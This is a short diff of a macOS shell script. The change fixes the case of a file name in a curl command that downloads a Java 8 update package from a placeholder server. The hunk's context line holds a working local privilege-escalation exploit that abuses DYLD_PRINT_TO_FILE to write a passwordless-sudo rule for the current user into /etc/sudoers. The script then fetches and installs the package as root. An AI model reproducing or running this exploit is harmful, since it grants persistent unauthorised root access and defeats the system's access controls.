@@ -43,7 +43,7 @@ echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sud
 
 #--- DOWNLOAD THE PACKAGE ---#
     echo -e "\033[1mcURLing Java_8_Update_60.pkg...\033[0m"
-    sudo curl -# http://<SERVER_ADDRESS>/Java_8_update_60.pkg -o /tmp$$/Java_8_Update_60.pkg
+    sudo curl -# http://<SERVER_ADDRESS>/Java_8_Update_60.pkg -o /tmp$$/Java_8_Update_60.pkg
     echo -e "\033[1mDone.\033[0m"
 
     echo;echo
